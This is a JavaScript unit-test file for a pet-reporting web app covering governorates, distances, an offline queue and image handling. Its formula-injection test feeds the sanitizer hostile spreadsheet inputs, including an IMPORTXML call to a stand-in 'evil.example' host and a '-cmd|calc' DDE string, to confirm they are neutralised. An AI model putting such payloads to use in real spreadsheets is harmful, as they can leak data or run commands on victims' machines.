import { describe, it, expect, beforeEach, vi } from 'vitest';
import {
  matchGovernorateId,
  findNearestGovernorateId,
  calculateDistanceKm,
  formatDistance,
  hasValidCoords
} from '../governorates';
import { formatTimeAgo, buildPetMapsUrl } from '../i18n';
import { buildPetFromSubmission } from '../api';
import { safeText, fromSafeText } from '../sanitize';
import {
  enqueueOfflineReport,
  getOfflineQueue,
  getFailedOfflineReports,
  discardFailedOfflineReport,
  flushOfflineQueue,
  MAX_OFFLINE_QUEUE
} from '../offlineQueue';
import {
  computeScaledDimensions,
  isHeicFile,
  compressImageFile
} from '../imageCompress';

// Simple in-memory localStorage mock for Node test environment
function createLocalStorageMock() {
  let store = new Map();
  let throwQuota = false;
  return {
    getItem(key) {
      return store.has(key) ? store.get(key) : null;
    },
    setItem(key, value) {
      if (throwQuota) {
        const err = new Error('QuotaExceededError');
        err.name = 'QuotaExceededError';
        throw err;
      }
      store.set(key, String(value));
    },
    removeItem(key) {
      store.delete(key);
    },
    clear() {
      store.clear();
    },
    setThrowQuota(flag) {
      throwQuota = Boolean(flag);
    }
  };
}

describe('governorates utilities', () => {
  it('matches governorate IDs by ISO code, English, and Arabic aliases', () => {
    expect(matchGovernorateId('EG-C')).toBe('cairo');
    expect(matchGovernorateId('Cairo Governorate')).toBe('cairo');
    expect(matchGovernorateId('محافظة الإسكندرية')).toBe('alexandria');
    expect(matchGovernorateId('الاسكندريه')).toBe('alexandria');
    expect(matchGovernorateId('Kafr El-Sheikh')).toBe('kafr_el_sheikh');
    expect(matchGovernorateId('unknown_place')).toBe('');
    expect(matchGovernorateId('')).toBe('');
  });

  it('finds nearest governorate inside Egypt and rejects outside coordinates', () => {
    expect(findNearestGovernorateId(30.0444, 31.2357)).toBe('cairo');
    expect(findNearestGovernorateId(31.2001, 29.9187)).toBe('alexandria');
    // Outside Egypt (London)
    expect(findNearestGovernorateId(51.5074, -0.1278)).toBe('');
    expect(findNearestGovernorateId(10.0, 31.0)).toBe('');
  });

  it('calculates Haversine distance and formats distance strings', () => {
    expect(calculateDistanceKm(30.0444, 31.2357, 30.0444, 31.2357)).toBeCloseTo(0, 5);
    const cairoToAlex = calculateDistanceKm(30.0444, 31.2357, 31.2001, 29.9187);
    expect(cairoToAlex).toBeGreaterThan(170);
    expect(cairoToAlex).toBeLessThan(190);
    expect(calculateDistanceKm('bad', 31, 30, 31)).toBeNull();

    expect(formatDistance(0.12, 'en')).toBe('100m away');
    expect(formatDistance(0.12, 'ar')).toContain('100 متر');
    expect(formatDistance(3.45, 'en')).toBe('3.5 km away');
    expect(formatDistance(25.4, 'en')).toBe('25 km away');
    expect(formatDistance(null, 'en')).toBe('');
  });

  it('handles optional GPS coordinates (null / empty) cleanly', () => {
    expect(hasValidCoords({ lat: 30.0444, lng: 31.2357 })).toBe(true);
    expect(hasValidCoords({ lat: null, lng: null })).toBe(false);
    expect(hasValidCoords({ lat: '', lng: '' })).toBe(false);
    expect(hasValidCoords({ lat: 0, lng: 0 })).toBe(false);
    expect(calculateDistanceKm(30.0444, 31.2357, null, null)).toBeNull();
    expect(calculateDistanceKm(30.0444, 31.2357, '', '')).toBeNull();

    const manualPet = buildPetFromSubmission(
      { gov: 'cairo', city: 'Maadi', lat: null, lng: null, type: 'cat', cond: 'healthy' },
      { id: 'pet-manual-1', photo: 'photo-1' }
    );
    expect(manualPet.lat).toBeNull();
    expect(manualPet.lng).toBeNull();
    expect(buildPetMapsUrl(manualPet, 'en')).toContain(encodeURIComponent('Maadi, Cairo, Egypt'));

    const gpsPet = buildPetFromSubmission(
      { gov: 'cairo', city: 'Maadi', lat: 29.9602, lng: 31.2569, type: 'dog', cond: 'injured' },
      { id: 'pet-gps-1', photo: 'photo-2' }
    );
    expect(gpsPet.lat).toBeCloseTo(29.9602, 4);
    expect(gpsPet.lng).toBeCloseTo(31.2569, 4);
    expect(buildPetMapsUrl(gpsPet, 'en')).toContain(encodeURIComponent('29.9602,31.2569'));
  });
});

describe('formatTimeAgo', () => {
  it('formats timestamps into relative localized strings', () => {
    const nowSec = Math.floor(Date.now() / 1000);
    expect(formatTimeAgo(nowSec - 10, 'en')).toBe('just now');
    expect(formatTimeAgo(nowSec - 5 * 60, 'en')).toBe('5 mins ago');
    expect(formatTimeAgo(nowSec - 3 * 3600, 'en')).toBe('3 hours ago');
    expect(formatTimeAgo(nowSec - 2 * 86400, 'ar')).toBe('منذ يومين');
    expect(formatTimeAgo(nowSec - 5 * 86400, 'ar')).toBe('منذ 5 أيام');
    expect(formatTimeAgo('not-a-date', 'en')).toBe('just now');
  });
});

describe('safeText / fromSafeText formula-injection guard', () => {
  it('prefixes dangerous spreadsheet formula starters with an apostrophe and strips on read', () => {
    expect(safeText('=IMPORTXML("http://evil.example", "//a")')).toBe(
      '\'=IMPORTXML("http://evil.example", "//a")'
    );
    expect(safeText('+201012345678')).toBe("'+201012345678");
    expect(safeText('-cmd|calc')).toBe("'-cmd|calc");
    expect(safeText('@SUM(A1:A2)')).toBe("'@SUM(A1:A2)");
    expect(safeText('\t=1+1')).toBe("'\t=1+1");
    expect(safeText('Friendly orange cat')).toBe('Friendly orange cat');

    expect(fromSafeText("'+201012345678")).toBe('+201012345678');
    expect(fromSafeText("'=1+1")).toBe('=1+1');
    expect(fromSafeText('Normal text')).toBe('Normal text');
  });
});

describe('offlineQueue', () => {
  let storageMock;

  beforeEach(() => {
    storageMock = createLocalStorageMock();
    vi.stubGlobal('localStorage', storageMock);
  });

  it('enqueues reports, enforces MAX_OFFLINE_QUEUE cap, and surfaces quota errors', () => {
    for (let i = 0; i < MAX_OFFLINE_QUEUE; i += 1) {
      const res = enqueueOfflineReport({ gov: 'cairo', note: `pet-${i}` });
      expect(res.ok).toBe(true);
      expect(res.entry.payload.id).toBeTruthy();
    }
    expect(getOfflineQueue()).toHaveLength(MAX_OFFLINE_QUEUE);

    // 16th item is rejected with reason='full'
    const fullRes = enqueueOfflineReport({ gov: 'cairo', note: 'overflow' });
    expect(fullRes).toEqual({ ok: false, reason: 'full' });

    // Quota failure returns reason='quota'
    storageMock.clear();
    storageMock.setThrowQuota(true);
    const quotaRes = enqueueOfflineReport({ gov: 'cairo', note: 'quota' });
    expect(quotaRes).toEqual({ ok: false, reason: 'quota' });
  });

  it('flushes single-flight without losing items enqueued mid-flush', async () => {
    const first = enqueueOfflineReport({ id: 'id-1', gov: 'cairo', city: 'Maadi' });
    expect(first.ok).toBe(true);

    let resolveSubmit;
    const submitFn = vi.fn(
      () =>
        new Promise((resolve) => {
          resolveSubmit = resolve;
        })
    );

    // Start two concurrent flushes; both should share the single-flight promise
    const flushPromise1 = flushOfflineQueue({ force: true, submitFn });
    const flushPromise2 = flushOfflineQueue({ force: true, submitFn });
    expect(flushPromise1).toBe(flushPromise2);

    // Enqueue a second item while the first item is in-flight
    const second = enqueueOfflineReport({ id: 'id-2', gov: 'giza', city: 'Dokki' });
    expect(second.ok).toBe(true);

    resolveSubmit({ ok: true, id: 'id-1', pet: { id: 'id-1', g: 'cairo' } });
    const result = await flushPromise1;

    expect(submitFn).toHaveBeenCalledTimes(1);
    expect(result.syncedCount).toBe(1);
    // Second item queued during flush must still be present in the queue!
    const remaining = getOfflineQueue();
    expect(remaining).toHaveLength(1);
    expect(remaining[0].payload.id).toBe('id-2');
  });

  it('keeps retryable errors in queue with backoff and moves permanent validation errors to failed list', async () => {
    enqueueOfflineReport({ id: 'retry-me', gov: 'cairo', city: 'Nasr City' });
    enqueueOfflineReport({ id: 'bad-item', gov: 'cairo', city: 'Zamalek' });

    const submitFn = vi.fn(async (payload) => {
      if (payload.id === 'retry-me') {
        const netErr = new Error('Network request timed out.');
        netErr.code = 'ERR_TIMEOUT';
        netErr.retryable = true;
        throw netErr;
      }
      const valErr = new Error('Coordinates must be within Egypt.');
      valErr.code = 'ERR_OUTSIDE_EGYPT';
      valErr.status = 400;
      valErr.retryable = false;
      throw valErr;
    });

    const res = await flushOfflineQueue({ force: true, submitFn });
    expect(res.syncedCount).toBe(0);
    expect(res.remainingCount).toBe(1);
    expect(res.failedCount).toBe(1);

    const active = getOfflineQueue();
    expect(active).toHaveLength(1);
    expect(active[0].payload.id).toBe('retry-me');
    expect(active[0].attempts).toBe(1);

    const failed = getFailedOfflineReports();
    expect(failed).toHaveLength(1);
    expect(failed[0].reason).toContain('Coordinates must be within Egypt');

    discardFailedOfflineReport(failed[0].queueId);
    expect(getFailedOfflineReports()).toHaveLength(0);
  });
});

describe('imageCompress utilities', () => {
  it('correctly calculates scaled dimensions within max bounds', () => {
    // Already within bounds
    expect(computeScaledDimensions(400, 300, 800)).toEqual({ width: 400, height: 300 });

    // Landscape image scaled down
    expect(computeScaledDimensions(1600, 1200, 800)).toEqual({ width: 800, height: 600 });

    // Portrait image scaled down
    expect(computeScaledDimensions(1200, 1600, 800)).toEqual({ width: 600, height: 800 });

    // Square image
    expect(computeScaledDimensions(1000, 1000, 700)).toEqual({ width: 700, height: 700 });
  });

  it('detects HEIC/HEIF files by MIME, extension, and header bytes', async () => {
    expect(await isHeicFile({ name: 'cat.heic', type: '' })).toBe(true);
    expect(await isHeicFile({ name: 'cat.HEIF', type: '' })).toBe(true);
    expect(await isHeicFile({ name: 'cat.jpg', type: 'image/heic' })).toBe(true);
    expect(await isHeicFile({ name: 'cat.png', type: 'image/png' })).toBe(false);

    // Mock file with ISOBMFF ftypheic container in header
    const mockHeicBuffer = new Uint8Array(32);
    // bytes 4-7: "ftyp"
    mockHeicBuffer.set([0x66, 0x74, 0x79, 0x70], 4);
    // bytes 8-11: "heic"
    mockHeicBuffer.set([0x68, 0x65, 0x69, 0x63], 8);

    const mockHeicBlob = {
      name: 'IMG_4567',
      type: 'application/octet-stream',
      slice: () => ({
        arrayBuffer: async () => mockHeicBuffer.buffer
      })
    };
    expect(await isHeicFile(mockHeicBlob)).toBe(true);

    const mockJpgBuffer = new Uint8Array(32);
    mockJpgBuffer.set([0xff, 0xd8, 0xff, 0xe0], 0);
    const mockJpgBlob = {
      name: 'IMG_4567',
      type: 'application/octet-stream',
      slice: () => ({
        arrayBuffer: async () => mockJpgBuffer.buffer
      })
    };
    expect(await isHeicFile(mockJpgBlob)).toBe(false);
  });

  it('rejects invalid or empty files with appropriate error codes', async () => {
    await expect(compressImageFile(null)).rejects.toMatchObject({
      code: 'ERR_INVALID_FILE'
    });

    await expect(
      compressImageFile({ name: 'document.pdf', type: 'application/pdf' })
    ).rejects.toMatchObject({
      code: 'ERR_INVALID_FILE'
    });
  });
});
